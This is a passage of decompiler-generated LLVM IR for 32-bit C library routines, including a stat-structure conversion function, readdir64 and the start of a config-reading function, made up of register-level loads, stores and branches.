  %v3_8053f8c = load i32, i32* %v2_8053f8c, align 4
  store i32 %v3_8053f8c, i32* %eax.global-to-local, align 4
  %v1_8053f8f = load i32, i32* %esi.global-to-local, align 4
  %v2_8053f8f = add i32 %v1_8053f8f, 24
  %v3_8053f8f = inttoptr i32 %v2_8053f8f to i32*
  store i32 %v3_8053f8c, i32* %v3_8053f8f, align 4
  %v0_8053f92 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053f92 = add i32 %v0_8053f92, 28
  %v2_8053f92 = inttoptr i32 %v1_8053f92 to i32*
  %v3_8053f92 = load i32, i32* %v2_8053f92, align 4
  store i32 %v3_8053f92, i32* %eax.global-to-local, align 4
  %v1_8053f95 = load i32, i32* %esi.global-to-local, align 4
  %v2_8053f95 = add i32 %v1_8053f95, 28
  %v3_8053f95 = inttoptr i32 %v2_8053f95 to i32*
  store i32 %v3_8053f92, i32* %v3_8053f95, align 4
  %v0_8053f98 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053f98 = add i32 %v0_8053f98, 32
  %v2_8053f98 = inttoptr i32 %v1_8053f98 to i16*
  %v3_8053f98 = load i16, i16* %v2_8053f98, align 2
  %v4_8053f98 = zext i16 %v3_8053f98 to i32
  store i32 %v4_8053f98, i32* %eax.global-to-local, align 4
  %v1_8053f9c = load i32, i32* %esi.global-to-local, align 4
  %v2_8053f9c = add i32 %v1_8053f9c, 32
  %v3_8053f9c = inttoptr i32 %v2_8053f9c to i32*
  store i32 %v4_8053f98, i32* %v3_8053f9c, align 4
  %v0_8053f9f = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053f9f = add i32 %v0_8053f9f, 44
  %v2_8053f9f = inttoptr i32 %v1_8053f9f to i32*
  %v3_8053f9f = load i32, i32* %v2_8053f9f, align 4
  store i32 %v3_8053f9f, i32* %eax.global-to-local, align 4
  %v1_8053fa2 = add i32 %v0_8053f9f, 48
  %v2_8053fa2 = inttoptr i32 %v1_8053fa2 to i32*
  %v3_8053fa2 = load i32, i32* %v2_8053fa2, align 4
  store i32 %v3_8053fa2, i32* %edx.global-to-local, align 4
  %v1_8053fa5 = load i32, i32* %esi.global-to-local, align 4
  %v2_8053fa5 = add i32 %v1_8053fa5, 44
  %v3_8053fa5 = inttoptr i32 %v2_8053fa5 to i32*
  store i32 %v3_8053f9f, i32* %v3_8053fa5, align 4
  %v0_8053fa8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053fa8 = add i32 %v0_8053fa8, 52
  %v2_8053fa8 = inttoptr i32 %v1_8053fa8 to i32*
  %v3_8053fa8 = load i32, i32* %v2_8053fa8, align 4
  store i32 %v3_8053fa8, i32* %eax.global-to-local, align 4
  %v1_8053fab = load i32, i32* %esi.global-to-local, align 4
  %v2_8053fab = add i32 %v1_8053fab, 52
  %v3_8053fab = inttoptr i32 %v2_8053fab to i32*
  store i32 %v3_8053fa8, i32* %v3_8053fab, align 4
  %v0_8053fae = load i32, i32* %edx.global-to-local, align 4
  %v1_8053fae = load i32, i32* %esi.global-to-local, align 4
  %v2_8053fae = add i32 %v1_8053fae, 48
  %v3_8053fae = inttoptr i32 %v2_8053fae to i32*
  store i32 %v0_8053fae, i32* %v3_8053fae, align 4
  %v0_8053fb1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053fb1 = add i32 %v0_8053fb1, 56
  %v2_8053fb1 = inttoptr i32 %v1_8053fb1 to i32*
  %v3_8053fb1 = load i32, i32* %v2_8053fb1, align 4
  store i32 %v3_8053fb1, i32* %eax.global-to-local, align 4
  %v1_8053fb4 = add i32 %v0_8053fb1, 64
  %v2_8053fb4 = inttoptr i32 %v1_8053fb4 to i32*
  %v3_8053fb4 = load i32, i32* %v2_8053fb4, align 4
  store i32 %v3_8053fb4, i32* %edx.global-to-local, align 4
  %v1_8053fb7 = load i32, i32* %esi.global-to-local, align 4
  %v2_8053fb7 = add i32 %v1_8053fb7, 56
  %v3_8053fb7 = inttoptr i32 %v2_8053fb7 to i32*
  store i32 %v3_8053fb1, i32* %v3_8053fb7, align 4
  %v0_8053fba = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053fba = add i32 %v0_8053fba, 68
  %v2_8053fba = inttoptr i32 %v1_8053fba to i32*
  %v3_8053fba = load i32, i32* %v2_8053fba, align 4
  store i32 %v3_8053fba, i32* %eax.global-to-local, align 4
  %v1_8053fbd = load i32, i32* %esi.global-to-local, align 4
  %v2_8053fbd = add i32 %v1_8053fbd, 68
  %v3_8053fbd = inttoptr i32 %v2_8053fbd to i32*
  store i32 %v3_8053fba, i32* %v3_8053fbd, align 4
  %v0_8053fc0 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053fc0 = add i32 %v0_8053fc0, 60
  %v2_8053fc0 = inttoptr i32 %v1_8053fc0 to i32*
  store i32 0, i32* %v2_8053fc0, align 4
  %v0_8053fc7 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053fc7 = load i32, i32* %esi.global-to-local, align 4
  %v2_8053fc7 = add i32 %v1_8053fc7, 64
  %v3_8053fc7 = inttoptr i32 %v2_8053fc7 to i32*
  store i32 %v0_8053fc7, i32* %v3_8053fc7, align 4
  %v0_8053fca = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053fca = add i32 %v0_8053fca, 72
  %v2_8053fca = inttoptr i32 %v1_8053fca to i32*
  %v3_8053fca = load i32, i32* %v2_8053fca, align 4
  store i32 %v3_8053fca, i32* %edx.global-to-local, align 4
  %v1_8053fcd = add i32 %v0_8053fca, 76
  %v2_8053fcd = inttoptr i32 %v1_8053fcd to i32*
  %v3_8053fcd = load i32, i32* %v2_8053fcd, align 4
  store i32 %v3_8053fcd, i32* %eax.global-to-local, align 4
  %v1_8053fd0 = load i32, i32* %esi.global-to-local, align 4
  %v2_8053fd0 = add i32 %v1_8053fd0, 72
  %v3_8053fd0 = inttoptr i32 %v2_8053fd0 to i32*
  store i32 %v3_8053fca, i32* %v3_8053fd0, align 4
  %v0_8053fd3 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053fd3 = load i32, i32* %esi.global-to-local, align 4
  %v2_8053fd3 = add i32 %v1_8053fd3, 76
  %v3_8053fd3 = inttoptr i32 %v2_8053fd3 to i32*
  store i32 %v0_8053fd3, i32* %v3_8053fd3, align 4
  %v0_8053fd6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053fd6 = add i32 %v0_8053fd6, 80
  %v2_8053fd6 = inttoptr i32 %v1_8053fd6 to i32*
  %v3_8053fd6 = load i32, i32* %v2_8053fd6, align 4
  store i32 %v3_8053fd6, i32* %edx.global-to-local, align 4
  %v1_8053fd9 = add i32 %v0_8053fd6, 84
  %v2_8053fd9 = inttoptr i32 %v1_8053fd9 to i32*
  %v3_8053fd9 = load i32, i32* %v2_8053fd9, align 4
  store i32 %v3_8053fd9, i32* %eax.global-to-local, align 4
  %v1_8053fdc = load i32, i32* %esi.global-to-local, align 4
  %v2_8053fdc = add i32 %v1_8053fdc, 80
  %v3_8053fdc = inttoptr i32 %v2_8053fdc to i32*
  store i32 %v3_8053fd6, i32* %v3_8053fdc, align 4
  %v0_8053fdf = load i32, i32* %eax.global-to-local, align 4
  %v1_8053fdf = load i32, i32* %esi.global-to-local, align 4
  %v2_8053fdf = add i32 %v1_8053fdf, 84
  %v3_8053fdf = inttoptr i32 %v2_8053fdf to i32*
  store i32 %v0_8053fdf, i32* %v3_8053fdf, align 4
  %v2_8053fe2 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8053fe2, i32* %eax.global-to-local, align 4
  %v2_8053fe3 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053fe3, i32* %ebx.global-to-local, align 4
  ret i32 %v2_8053fe2

; uselistorder directives
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 13, 8, 9, 10, 11, 12, 14 }
  uselistorder i32 92, { 6, 7, 5, 8, 0, 1, 2, 9, 10, 11, 12, 13, 3, 14, 15, 4 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg1 to i32
  %tmp4 = inttoptr i32 %arg2 to i8*
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8053fe9 = load i32, i32* @ebx, align 4
  store i32 %v0_8053fe9, i32* %stack_var_-12, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  store i32 %tmp2, i32* %ebx.global-to-local, align 4
  %v5_8053ffe = call i8* @_memset(i8* %tmp4, i32 0, i32 22)
  %v2_8054000 = load i32, i32* %arg1, align 4
  store i32 %v2_8054000, i32* %eax.global-to-local, align 4
  %v1_8054002 = add i32 %tmp2, 4
  %v2_8054002 = inttoptr i32 %v1_8054002 to i32*
  %v3_8054002 = load i32, i32* %v2_8054002, align 4
  store i32 %v3_8054002, i32* %edx.global-to-local, align 4
  %v1_8054005 = load i32, i32* %esi.global-to-local, align 4
  %v2_8054005 = add i32 %v1_8054005, 4
  %v3_8054005 = inttoptr i32 %v2_8054005 to i32*
  store i32 %v3_8054002, i32* %v3_8054005, align 4
  %v0_8054008 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054008 = load i32, i32* %esi.global-to-local, align 4
  %v2_8054008 = inttoptr i32 %v1_8054008 to i32*
  store i32 %v0_8054008, i32* %v2_8054008, align 4
  %v0_805400a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805400a = add i32 %v0_805400a, 88
  %v2_805400a = inttoptr i32 %v1_805400a to i32*
  %v3_805400a = load i32, i32* %v2_805400a, align 4
  store i32 %v3_805400a, i32* %eax.global-to-local, align 4
  %v0_805400d = load i32, i32* %esi.global-to-local, align 4
  %v1_805400d = add i32 %v0_805400d, 36
  %v2_805400d = inttoptr i32 %v1_805400d to i32*
  store i32 0, i32* %v2_805400d, align 4
  %v0_8054014 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054014 = load i32, i32* %esi.global-to-local, align 4
  %v2_8054014 = add i32 %v1_8054014, 12
  %v3_8054014 = inttoptr i32 %v2_8054014 to i32*
  store i32 %v0_8054014, i32* %v3_8054014, align 4
  %v0_8054017 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054017 = add i32 %v0_8054017, 16
  %v2_8054017 = inttoptr i32 %v1_8054017 to i32*
  %v3_8054017 = load i32, i32* %v2_8054017, align 4
  store i32 %v3_8054017, i32* %eax.global-to-local, align 4
  %v1_805401a = load i32, i32* %esi.global-to-local, align 4
  %v2_805401a = add i32 %v1_805401a, 16
  %v3_805401a = inttoptr i32 %v2_805401a to i32*
  store i32 %v3_8054017, i32* %v3_805401a, align 4
  %v0_805401d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805401d = add i32 %v0_805401d, 20
  %v2_805401d = inttoptr i32 %v1_805401d to i32*
  %v3_805401d = load i32, i32* %v2_805401d, align 4
  store i32 %v3_805401d, i32* %eax.global-to-local, align 4
  %v1_8054020 = load i32, i32* %esi.global-to-local, align 4
  %v2_8054020 = add i32 %v1_8054020, 20
  %v3_8054020 = inttoptr i32 %v2_8054020 to i32*
  store i32 %v3_805401d, i32* %v3_8054020, align 4
  %v0_8054023 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054023 = add i32 %v0_8054023, 24
  %v2_8054023 = inttoptr i32 %v1_8054023 to i32*
  %v3_8054023 = load i32, i32* %v2_8054023, align 4
  store i32 %v3_8054023, i32* %eax.global-to-local, align 4
  %v1_8054026 = load i32, i32* %esi.global-to-local, align 4
  %v2_8054026 = add i32 %v1_8054026, 24
  %v3_8054026 = inttoptr i32 %v2_8054026 to i32*
  store i32 %v3_8054023, i32* %v3_8054026, align 4
  %v0_8054029 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054029 = add i32 %v0_8054029, 28
  %v2_8054029 = inttoptr i32 %v1_8054029 to i32*
  %v3_8054029 = load i32, i32* %v2_8054029, align 4
  store i32 %v3_8054029, i32* %eax.global-to-local, align 4
  %v1_805402c = load i32, i32* %esi.global-to-local, align 4
  %v2_805402c = add i32 %v1_805402c, 28
  %v3_805402c = inttoptr i32 %v2_805402c to i32*
  store i32 %v3_8054029, i32* %v3_805402c, align 4
  %v0_805402f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805402f = add i32 %v0_805402f, 32
  %v2_805402f = inttoptr i32 %v1_805402f to i16*
  %v3_805402f = load i16, i16* %v2_805402f, align 2
  %v4_805402f = zext i16 %v3_805402f to i32
  store i32 %v4_805402f, i32* %eax.global-to-local, align 4
  %v1_8054033 = load i32, i32* %esi.global-to-local, align 4
  %v2_8054033 = add i32 %v1_8054033, 32
  %v3_8054033 = inttoptr i32 %v2_8054033 to i32*
  store i32 %v4_805402f, i32* %v3_8054033, align 4
  %v0_8054036 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054036 = add i32 %v0_8054036, 44
  %v2_8054036 = inttoptr i32 %v1_8054036 to i32*
  %v3_8054036 = load i32, i32* %v2_8054036, align 4
  store i32 %v3_8054036, i32* %eax.global-to-local, align 4
  %v1_8054039 = load i32, i32* %esi.global-to-local, align 4
  %v2_8054039 = add i32 %v1_8054039, 44
  %v3_8054039 = inttoptr i32 %v2_8054039 to i32*
  store i32 %v3_8054036, i32* %v3_8054039, align 4
  %v0_805403c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805403c = add i32 %v0_805403c, 52
  %v2_805403c = inttoptr i32 %v1_805403c to i32*
  %v3_805403c = load i32, i32* %v2_805403c, align 4
  store i32 %v3_805403c, i32* %eax.global-to-local, align 4
  %v1_805403f = load i32, i32* %esi.global-to-local, align 4
  %v2_805403f = add i32 %v1_805403f, 48
  %v3_805403f = inttoptr i32 %v2_805403f to i32*
  store i32 %v3_805403c, i32* %v3_805403f, align 4
  %v0_8054042 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054042 = add i32 %v0_8054042, 56
  %v2_8054042 = inttoptr i32 %v1_8054042 to i32*
  %v3_8054042 = load i32, i32* %v2_8054042, align 4
  store i32 %v3_8054042, i32* %eax.global-to-local, align 4
  %v1_8054045 = load i32, i32* %esi.global-to-local, align 4
  %v2_8054045 = add i32 %v1_8054045, 52
  %v3_8054045 = inttoptr i32 %v2_8054045 to i32*
  store i32 %v3_8054042, i32* %v3_8054045, align 4
  %v0_8054048 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054048 = add i32 %v0_8054048, 64
  %v2_8054048 = inttoptr i32 %v1_8054048 to i32*
  %v3_8054048 = load i32, i32* %v2_8054048, align 4
  store i32 %v3_8054048, i32* %edx.global-to-local, align 4
  %v1_805404b = add i32 %v0_8054048, 68
  %v2_805404b = inttoptr i32 %v1_805404b to i32*
  %v3_805404b = load i32, i32* %v2_805404b, align 4
  store i32 %v3_805404b, i32* %eax.global-to-local, align 4
  %v1_805404e = load i32, i32* %esi.global-to-local, align 4
  %v2_805404e = add i32 %v1_805404e, 60
  %v3_805404e = inttoptr i32 %v2_805404e to i32*
  store i32 %v3_805404b, i32* %v3_805404e, align 4
  %v0_8054051 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054051 = load i32, i32* %esi.global-to-local, align 4
  %v2_8054051 = add i32 %v1_8054051, 56
  %v3_8054051 = inttoptr i32 %v2_8054051 to i32*
  store i32 %v0_8054051, i32* %v3_8054051, align 4
  %v0_8054054 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054054 = add i32 %v0_8054054, 72
  %v2_8054054 = inttoptr i32 %v1_8054054 to i32*
  %v3_8054054 = load i32, i32* %v2_8054054, align 4
  store i32 %v3_8054054, i32* %edx.global-to-local, align 4
  %v1_8054057 = add i32 %v0_8054054, 76
  %v2_8054057 = inttoptr i32 %v1_8054057 to i32*
  %v3_8054057 = load i32, i32* %v2_8054057, align 4
  store i32 %v3_8054057, i32* %eax.global-to-local, align 4
  %v1_805405a = load i32, i32* %esi.global-to-local, align 4
  %v2_805405a = add i32 %v1_805405a, 68
  %v3_805405a = inttoptr i32 %v2_805405a to i32*
  store i32 %v3_8054057, i32* %v3_805405a, align 4
  %v0_805405d = load i32, i32* %edx.global-to-local, align 4
  %v1_805405d = load i32, i32* %esi.global-to-local, align 4
  %v2_805405d = add i32 %v1_805405d, 64
  %v3_805405d = inttoptr i32 %v2_805405d to i32*
  store i32 %v0_805405d, i32* %v3_805405d, align 4
  %v0_8054060 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054060 = add i32 %v0_8054060, 80
  %v2_8054060 = inttoptr i32 %v1_8054060 to i32*
  %v3_8054060 = load i32, i32* %v2_8054060, align 4
  store i32 %v3_8054060, i32* %edx.global-to-local, align 4
  %v1_8054063 = add i32 %v0_8054060, 84
  %v2_8054063 = inttoptr i32 %v1_8054063 to i32*
  %v3_8054063 = load i32, i32* %v2_8054063, align 4
  store i32 %v3_8054063, i32* %eax.global-to-local, align 4
  %v1_8054066 = load i32, i32* %esi.global-to-local, align 4
  %v2_8054066 = add i32 %v1_8054066, 76
  %v3_8054066 = inttoptr i32 %v2_8054066 to i32*
  store i32 %v3_8054063, i32* %v3_8054066, align 4
  %v0_8054069 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054069 = load i32, i32* %esi.global-to-local, align 4
  %v2_8054069 = add i32 %v1_8054069, 72
  %v3_8054069 = inttoptr i32 %v2_8054069 to i32*
  store i32 %v0_8054069, i32* %v3_8054069, align 4
  %v2_805406c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805406c, i32* %edx.global-to-local, align 4
  %v2_805406d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805406d, i32* @ebx, align 4
  ret i32 %v3_8054063

; uselistorder directives
  uselistorder i32 84, { 7, 5, 6, 4, 0, 1, 8, 2, 3 }
  uselistorder i32 80, { 6, 3, 4, 2, 5, 7, 8, 0, 9, 10, 11, 12, 1 }
  uselistorder i32 76, { 7, 8, 5, 6, 4, 9, 10, 11, 2, 0, 1, 3 }
  uselistorder i32 72, { 6, 7, 4, 5, 3, 17, 0, 8, 9, 10, 11, 12, 13, 14, 15, 1, 2, 16 }
  uselistorder i32 88, { 8, 6, 7, 5, 9, 0, 10, 1, 2, 3, 4 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8054074 = load i32, i32* @esi, align 4
  %v0_8054075 = load i32, i32* @ebx, align 4
  store i32 %v0_8054075, i32* %stack_var_-8, align 4
  store i32 %tmp2, i32* @esi, align 4
  %v1_805407d = add i32 %tmp2, 24
  store i32 %v1_805407d, i32* @ebx, align 4
  %v4_805408b = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134559876, i32 %v1_805407d)
  %v0_8054090 = load i32, i32* @ebx, align 4
  %v1_8054091 = call i32 @__pthread_return_0(i32 %v0_8054090)
  br label %dec_label_pc_8054099

dec_label_pc_8054099:                             ; preds = %dec_label_pc_80540c3, %entry
  %v0_8054099 = load i32, i32* @esi, align 4
  %v1_8054099 = add i32 %v0_8054099, 8
  %v2_8054099 = inttoptr i32 %v1_8054099 to i32*
  %v3_8054099 = load i32, i32* %v2_8054099, align 4
  %v2_805409c = add i32 %v0_8054099, 4
  %v3_805409c = inttoptr i32 %v2_805409c to i32*
  %v4_805409c = load i32, i32* %v3_805409c, align 4
  %v6_805409f = icmp ugt i32 %v3_8054099, %v4_805409c
  br i1 %v6_805409f, label %dec_label_pc_80540c3, label %dec_label_pc_80540a1

dec_label_pc_80540a1:                             ; preds = %dec_label_pc_8054099
  %v1_80540a1 = add i32 %v0_8054099, 20
  %v2_80540a1 = inttoptr i32 %v1_80540a1 to i32*
  %v3_80540a1 = load i32, i32* %v2_80540a1, align 4
  %v1_80540a4 = add i32 %v0_8054099, 12
  %v2_80540a4 = inttoptr i32 %v1_80540a4 to i32*
  %v3_80540a4 = load i32, i32* %v2_80540a4, align 4
  %v1_80540a7 = inttoptr i32 %v0_8054099 to i32*
  %v2_80540a7 = load i32, i32* %v1_80540a7, align 4
  %v3_80540a9 = inttoptr i32 %v3_80540a4 to i32*
  %v4_80540a9 = call i32 @__getdents64(i32 %v2_80540a7, i32* %v3_80540a9, i32 %v3_80540a1)
  %tmp11 = icmp slt i32 %v4_80540a9, 1
  %tmp12 = icmp eq i1 %tmp11, false
  br i1 %tmp12, label %dec_label_pc_80540b9, label %dec_label_pc_80540b5

dec_label_pc_80540b5:                             ; preds = %dec_label_pc_80540a1
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_80540e1

dec_label_pc_80540b9:                             ; preds = %dec_label_pc_80540a1
  %v1_80540b9 = load i32, i32* @esi, align 4
  %v2_80540b9 = add i32 %v1_80540b9, 8
  %v3_80540b9 = inttoptr i32 %v2_80540b9 to i32*
  store i32 %v4_80540a9, i32* %v3_80540b9, align 4
  %v0_80540bc = load i32, i32* @esi, align 4
  %v1_80540bc = add i32 %v0_80540bc, 4
  %v2_80540bc = inttoptr i32 %v1_80540bc to i32*
  store i32 0, i32* %v2_80540bc, align 4
  %v0_80540c3.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80540c3

dec_label_pc_80540c3:                             ; preds = %dec_label_pc_8054099, %dec_label_pc_80540b9
  %v1_80540d1 = phi i32 [ %v0_8054099, %dec_label_pc_8054099 ], [ %v0_80540c3.pre, %dec_label_pc_80540b9 ]
  %v1_80540c3 = add i32 %v1_80540d1, 4
  %v2_80540c3 = inttoptr i32 %v1_80540c3 to i32*
  %v3_80540c3 = load i32, i32* %v2_80540c3, align 4
  %v2_80540c8 = add i32 %v1_80540d1, 12
  %v3_80540c8 = inttoptr i32 %v2_80540c8 to i32*
  %v4_80540c8 = load i32, i32* %v3_80540c8, align 4
  %v5_80540c8 = add i32 %v4_80540c8, %v3_80540c3
  store i32 %v5_80540c8, i32* @ebx, align 4
  %v1_80540cb = add i32 %v5_80540c8, 16
  %v2_80540cb = inttoptr i32 %v1_80540cb to i16*
  %v3_80540cb = load i16, i16* %v2_80540cb, align 2
  %v4_80540cb = zext i16 %v3_80540cb to i32
  %v2_80540cf = add i32 %v4_80540cb, %v3_80540c3
  store i32 %v2_80540cf, i32* %v2_80540c3, align 4
  %v0_80540d4 = load i32, i32* @ebx, align 4
  %v1_80540d4 = add i32 %v0_80540d4, 8
  %v2_80540d4 = inttoptr i32 %v1_80540d4 to i32*
  %v3_80540d4 = load i32, i32* %v2_80540d4, align 4
  %v1_80540d7 = load i32, i32* @esi, align 4
  %v2_80540d7 = add i32 %v1_80540d7, 16
  %v3_80540d7 = inttoptr i32 %v2_80540d7 to i32*
  store i32 %v3_80540d4, i32* %v3_80540d7, align 4
  %v0_80540da = load i32, i32* @ebx, align 4
  %v1_80540da = inttoptr i32 %v0_80540da to i32*
  %v2_80540da = load i32, i32* %v1_80540da, align 4
  %v2_80540dc = add i32 %v0_80540da, 4
  %v3_80540dc = inttoptr i32 %v2_80540dc to i32*
  %v4_80540dc = load i32, i32* %v3_80540dc, align 4
  %v5_80540dc = or i32 %v4_80540dc, %v2_80540da
  %v6_80540dc = icmp eq i32 %v5_80540dc, 0
  br i1 %v6_80540dc, label %dec_label_pc_8054099, label %dec_label_pc_80540e1

dec_label_pc_80540e1:                             ; preds = %dec_label_pc_80540c3, %dec_label_pc_80540b5
  %v3_80540e8 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v0_80540ed = load i32, i32* @ebx, align 4
  %v2_80540f2 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80540f2, i32* @ebx, align 4
  store i32 %v0_8054074, i32* @esi, align 4
  ret i32 %v0_80540ed

; uselistorder directives
  uselistorder i32 %v1_80540d1, { 1, 0 }
  uselistorder i32 %v4_80540a9, { 1, 0 }
  uselistorder i32 %v0_8054099, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %tmp2, { 1, 0 }
  uselistorder i32 (i32*, i32)* @_pthread_cleanup_pop_restore, { 0, 7, 5, 4, 3, 6, 1, 2 }
  uselistorder i32 (i32)* @__pthread_return_0, { 10, 3, 2, 1, 0, 5, 6, 7, 4, 9, 8 }
  uselistorder i32 (i32*, i32, i32)* @_pthread_cleanup_push_defer, { 0, 7, 5, 4, 3, 6, 1, 2 }
  uselistorder label %dec_label_pc_80540c3, { 1, 0 }
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %tmp42 = ptrtoint i32* %arg1 to i32
  %stack_var_-40 = alloca i8*, align 4
  %v15_80540fc = ptrtoint i8** %stack_var_-40 to i32
  store i32 %tmp42, i32* @esi, align 4
  %v1_8054103 = icmp eq i32* %arg1, null
  br i1 %v1_8054103, label %dec_label_pc_8054356, label %dec_label_pc_805410b

dec_label_pc_805410b:                             ; preds = %entry
  %v4_805410b = mul i32 %arg2, 4
  %v2_8054118 = and i32 %v4_805410b, 1020
  %v1_8054122 = or i32 %v2_8054118, 1
  store i32 %v1_8054122, i32* %eax.global-to-local, align 4
  %v4_8054127 = inttoptr i32 %v1_8054122 to i8*
  store i8* %v4_8054127, i8** %stack_var_-40, align 4
  %v1_805412a = add i32 %tmp42, 4
  %v2_805412a = inttoptr i32 %v1_805412a to i32*
  %v1_8054165 = add i32 %tmp42, 8
  %v2_8054165 = inttoptr i32 %v1_8054165 to i32*
  %v2_805416d = add i32 %tmp42, 12
  %v3_805416d = inttoptr i32 %v2_805416d to i32*
  %v1_8054172 = add i32 %tmp42, 16
  %v2_8054172 = inttoptr i32 %v1_8054172 to i32*
  %v1_80541d1 = add i32 %tmp42, 20
  %v2_80541d1 = inttoptr i32 %v1_80541d1 to i8*
  br label %dec_label_pc_805412a

dec_label_pc_805412a:                             ; preds = %dec_label_pc_8054348, %dec_label_pc_8054266, %dec_label_pc_805425c, %dec_label_pc_805410b
  %v3_805412a = load i32, i32* %v2_805412a, align 4
  %v4_805412a = icmp eq i32 %v3_805412a, 0
  %v1_805412e = icmp eq i1 %v4_805412a, false
  br i1 %v1_805412e, label %dec_label_pc_8054165, label %dec_label_pc_8054130

dec_label_pc_8054130:                             ; preds = %dec_label_pc_805412a
  %v3_8054130 = load i32, i32* %v2_8054172, align 4
  %v4_8054130 = icmp eq i32 %v3_8054130, 0
  %v1_8054134 = icmp eq i1 %v4_8054130, false
  br i1 %v1_8054134, label %dec_label_pc_805413d, label %dec_label_pc_8054136

dec_label_pc_8054136:                             ; preds = %dec_label_pc_8054130
  store i32 81, i32* %v2_8054172, align 4
  br label %dec_label_pc_805413d

dec_label_pc_805413d:                             ; preds = %dec_label_pc_8054130, %dec_label_pc_8054136
  %v3_805413d = load i32, i32* %v2_8054165, align 4
  %v4_805413d = icmp eq i32 %v3_805413d, 0
  %v1_8054141 = icmp eq i1 %v4_805413d, false
  br i1 %v1_8054141, label %dec_label_pc_8054149, label %dec_label_pc_8054143

dec_label_pc_8054143:                             ; preds = %dec_label_pc_805413d
  %v0_8054143 = load i32, i32* @esp, align 4
  %v1_8054143 = inttoptr i32 %v0_8054143 to i32*
  %v2_8054143 = load i32, i32* %v1_8054143, align 4
  store i32 %v2_8054143, i32* %eax.global-to-local, align 4
  store i32 %v2_8054143, i32* %v2_8054165, align 4
  br label %dec_label_pc_8054149

dec_label_pc_8054149:                             ; preds = %dec_label_pc_805413d, %dec_label_pc_8054143
  %v3_8054149 = phi i32 [ %v3_805413d, %dec_label_pc_805413d ], [ %v2_8054143, %dec_label_pc_8054143 ]
  store i32 %v3_8054149, i32* %eax.global-to-local, align 4
  %v4_805414c = load i32, i32* %v2_8054172, align 4
  %v5_805414c = add i32 %v4_805414c, %v3_8054149
  store i32 %v5_805414c, i32* %eax.global-to-local, align 4
  %v1_805414f = load i32, i32* @esp, align 4
  %v2_805414f = add i32 %v1_805414f, -4
  %v3_805414f = inttoptr i32 %v2_805414f to i32*
  store i32 %v5_805414c, i32* %v3_805414f, align 4
  %v0_8054150 = load i8*, i8** %stack_var_-40, align 4
  %v1_8054150 = ptrtoint i8* %v0_8054150 to i32
  %v2_8054150 = call i32 @malloc(i32 %v1_8054150)
  store i32 %v2_8054150, i32* %eax.global-to-local, align 4
  store i32 %v2_8054150, i32* %v2_805412a, align 4
  %v1_8054158 = icmp eq i32 %v2_8054150, 0
  %v0_805415a = load i32, i32* @esp, align 4
  %v3_805415a = add i32 %v0_805415a, 4
  br i1 %v1_8054158, label %dec_label_pc_8054356, label %dec_label_pc_8054161

dec_label_pc_8054161:                             ; preds = %dec_label_pc_8054149
  %v3_8054161 = load i8, i8* %v2_80541d1, align 1
  %v4_8054161 = or i8 %v3_8054161, 1
  store i8 %v4_8054161, i8* %v2_80541d1, align 1
  br label %dec_label_pc_8054165

dec_label_pc_8054165:                             ; preds = %dec_label_pc_805412a, %dec_label_pc_8054161
  %v3_8054165 = load i32, i32* %v2_8054165, align 4
  store i32 %v3_8054165, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  %v4_805416a = load i32, i32* %v2_805412a, align 4
  %v5_805416a = add i32 %v4_805416a, %v3_8054165
  store i32 %v5_805416a, i32* %eax.global-to-local, align 4
  store i32 %v5_805416a, i32* %v3_805416d, align 4
  br label %dec_label_pc_8054170

dec_label_pc_8054170:                             ; preds = %dec_label_pc_80541d7, %dec_label_pc_80541ce, %dec_label_pc_8054165
